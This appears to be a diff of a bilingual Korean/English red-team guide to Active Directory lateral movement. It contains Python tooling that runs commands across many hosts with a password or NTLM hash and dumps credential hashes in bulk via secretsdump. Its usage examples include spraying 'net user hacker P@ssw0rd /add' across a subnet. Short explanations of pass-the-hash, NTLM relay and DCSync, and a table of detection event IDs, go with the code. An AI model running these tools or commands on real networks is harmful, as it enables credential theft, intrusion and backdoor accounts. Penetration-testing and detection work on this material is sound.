@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # AD 횡이동 — NTLM 릴레이·DCSync·PsExec·원격 실행
 
 ## 1. 횡이동 기법 개요
@@ -160,7 +166,7 @@ def run_wmiexec(
             error=result.stderr[:200] if not success else "",
         )
     except subprocess.TimeoutExpired:
-        return ExecutionResult(target=target, method="wmiexec", success=False, output="", error="타임아웃")
+        return ExecutionResult(target=target, method="wmiexec", success=False, output="", error="Timeout")
     except Exception as e:
         return ExecutionResult(target=target, method="wmiexec", success=False, output="", error=str(e))
 
@@ -185,31 +191,31 @@ def spray_credentials(
             target = futures[future]
             result = future.result()
             if result.success:
-                print(f"[+] {target}: 성공")
+                print(f"[+] {target}: Success")
                 print(f"    {result.output[:200]}")
             else:
-                print(f"[-] {target}: 실패 ({result.error[:100]})")
+                print(f"[-] {target}: Failed ({result.error[:100]})")
             results.append(result)
 
     return results
 
 
 def expand_cidr(cidr: str) -> list[str]:
-    """CIDR 표기를 IP 목록으로 변환."""
+    """Convert CIDR notation to IP list."""
     network = ipaddress.ip_network(cidr, strict=False)
     return [str(ip) for ip in network.hosts()]
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="AD 횡이동 자동화")
+    parser = argparse.ArgumentParser(description="AD Lateral Movement Automation")
     sub = parser.add_subparsers(dest="cmd", required=True)
 
-    spray_p = sub.add_parser("spray", help="다중 호스트 명령 실행")
-    spray_p.add_argument("targets", help="대상 IP/CIDR 또는 파일 경로")
+    spray_p = sub.add_parser("spray", help="Execute command on multiple hosts")
+    spray_p.add_argument("targets", help="Target IP/CIDR or file path")
     spray_p.add_argument("domain")
     spray_p.add_argument("-u", "--user", required=True)
-    spray_p.add_argument("-p", "--password", help="패스워드")
-    spray_p.add_argument("-H", "--hash", help="NTLM 해시")
+    spray_p.add_argument("-p", "--password", help="Password")
+    spray_p.add_argument("-H", "--hash", help="NTLM hash")
     spray_p.add_argument("-c", "--command", required=True)
     spray_p.add_argument("--workers", type=int, default=10)
     spray_p.add_argument("-o", "--output", type=Path)
@@ -217,7 +223,6 @@ def main() -> None:
     args = parser.parse_args()
 
     if args.cmd == "spray":
-        # 대상 목록 준비
         target_input = args.targets
         if Path(target_input).exists():
             targets = Path(target_input).read_text().splitlines()
@@ -227,19 +232,19 @@ def main() -> None:
             targets = [target_input]
 
         if not (args.password or args.hash):
-            parser.error("패스워드(-p) 또는 해시(-H) 필요")
+            parser.error("Password (-p) or hash (-H) required")
 
         credential = args.hash or args.password
         use_hash = bool(args.hash)
 
-        print(f"[*] {len(targets)}개 호스트 대상 명령 실행 시작")
+        print(f"[*] Starting command execution on {len(targets)} hosts")
         results = spray_credentials(
             targets, args.domain, args.user, credential,
             args.command, use_hash, args.workers,
         )
 
         success_count = sum(1 for r in results if r.success)
-        print(f"\n총 {len(results)}개 / 성공 {success_count}개")
+        print(f"\nTotal {len(results)} / Success {success_count}")
 
         if args.output:
             import json
@@ -312,8 +317,8 @@ def dump_secrets(
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="자격증명 덤프 자동화")
-    parser.add_argument("targets", help="대상 파일 또는 IP")
+    parser = argparse.ArgumentParser(description="Credential Dump Automation")
+    parser.add_argument("targets", help="Target file or IP")
     parser.add_argument("domain")
     parser.add_argument("-u", "--user", required=True)
     parser.add_argument("-p", "--password")
@@ -339,12 +344,12 @@ def main() -> None:
         for future in as_completed(futures):
             dump = future.result()
             if dump.ntlm_hashes:
-                print(f"[+] {dump.target}: {len(dump.ntlm_hashes)}개 해시")
+                print(f"[+] {dump.target}: {len(dump.ntlm_hashes)} hashes")
                 all_hashes.extend(dump.ntlm_hashes)
 
     if all_hashes:
         args.output.write_text("\n".join(set(all_hashes)))
-        print(f"\n총 {len(set(all_hashes))}개 유니크 해시 → {args.output}")
+        print(f"\nTotal {len(set(all_hashes))} unique hashes → {args.output}")
 
 
 if __name__ == "__main__":
@@ -364,3 +369,105 @@ if __name__ == "__main__":
 | 5145 | 네트워크 공유 접근 | ADMIN$·C$ 접근 |
 | 4662 | AD 객체 작업 | DCSync (DS-Replication) |
 | 7045 | 서비스 설치 | psexec 서비스 생성 |
+
+---
+
+<a name="english"></a>
+
+# AD Lateral Movement — NTLM Relay, DCSync, PsExec, and Remote Execution
+
+## 1. Lateral Movement Technique Overview
+
+| Technique | Tool | Required Privilege |
+|-----------|------|--------------------|
+| PsExec | psexec.py / Sysinternals | Local administrator |
+| WMI | wmiexec.py | Local administrator |
+| WinRM | evil-winrm | WinRM access |
+| DCOM | dcomexec.py | Local administrator |
+| Pass-the-Hash | pth-winexe | Local admin NTLM hash |
+| Pass-the-Ticket | Rubeus / ticketer.py | Valid Kerberos ticket |
+| NTLM Relay | ntlmrelayx.py | Network position |
+| DCSync | secretsdump.py | DS-Replication permission |
+
+---
+
+## 2. Pass-the-Hash (PtH)
+
+PtH leverages the NTLM authentication protocol's design flaw: authentication uses the hash directly rather than a derived value. If an attacker captures a user's NTLM hash from memory or the SAM database, they can authenticate as that user without knowing the plaintext password.
+
+**Tools and targets:**
+- `psexec.py -hashes` — creates a service on the target for code execution (noisy, creates Event 7045)
+- `wmiexec.py -hashes` — uses WMI for execution (no service creation, quieter)
+- `smbexec.py -hashes` — similar to psexec but harder to detect
+- `evil-winrm -H` — PowerShell remoting over WinRM port 5985
+- `xfreerdp /pth` — RDP via hash (requires Restricted Admin mode)
+- `netexec smb -H --local-auth` — bulk testing across an entire subnet
+
+---
+
+## 3. NTLM Relay Attack
+
+NTLM relay captures NTLM authentication attempts and relays them to other targets in real-time. The four-step process:
+
+1. **Identify targets without SMB signing** — unsigned SMB allows relay attacks
+2. **Configure Responder** — disable SMB and HTTP listeners (prevent capturing, only poisoning)
+3. **Run ntlmrelayx** — relay captured credentials to targets for code execution or LDAP privilege escalation
+4. **Trigger NTLM auth** — use Responder to respond to LLMNR/NBT-NS queries, tricking systems into authenticating to the attacker
+
+**Advanced variants:**
+- LDAP relay → privilege escalation (add DCSync rights to attacker account)
+- LDAPS relay → Shadow Credentials attack (add key credential to target)
+- IPv6 relay via mitm6 → WPAD spoofing for automatic proxy configuration
+
+---
+
+## 4. DCSync Attack
+
+DCSync abuses the `DS-Replication-Get-Changes-All` permission (normally held only by Domain Controllers) to pull password hashes from the domain without touching the DC locally. This simulates a legitimate DC replication request.
+
+**Required permission:** `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (typically Domain Admins, Enterprise Admins, or Domain Controllers groups)
+
+**Detection:** Event ID 4662 (AD object access) with `DS-Replication-Get-Changes-All` access type, originating from a non-DC IP address.
+
+---
+
+## 5. Remote Execution Automation CLI
+
+The spray tool executes a command across multiple targets in parallel using wmiexec, supporting both password and NTLM hash authentication. Input can be a single IP, CIDR range, or a file containing IP addresses.
+
+**Usage:**
+```bash
+# Password-based spray
+python3 lateral_movement.py spray 10.10.10.0/24 corp.local \
+    -u administrator -p Password123 -c "whoami" --workers 20
+
+# Hash-based spray
+python3 lateral_movement.py spray targets.txt corp.local \
+    -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH \
+    -c "net user hacker P@ssw0rd /add" -o results.json
+```
+
+---
+
+## 6. Credential Dump Automation
+
+The credential dump automation uses Impacket's `secretsdump` to extract NTLM hashes from multiple targets in parallel, deduplicates the results, and saves them to a file.
+
+**Usage:**
+```bash
+python3 cred_dump.py targets.txt corp.local -u admin -H NTLM_HASH -o all_hashes.txt
+```
+
+---
+
+## 7. Detection Priority
+
+| Event ID | Meaning | Lateral Movement Relevance |
+|----------|---------|---------------------------|
+| 4624 | Logon success | Type 3 (network) / Type 10 (remote interactive) |
+| 4648 | Explicit credential logon | PtH / PtT |
+| 4672 | Special privilege logon | Administrator privilege use |
+| 4688 | Process creation | psexec / wmiexec spawning |
+| 5145 | Network share access | ADMIN$, C$ access |
+| 4662 | AD object operation | DCSync (DS-Replication) |
+| 7045 | Service installation | psexec service creation |
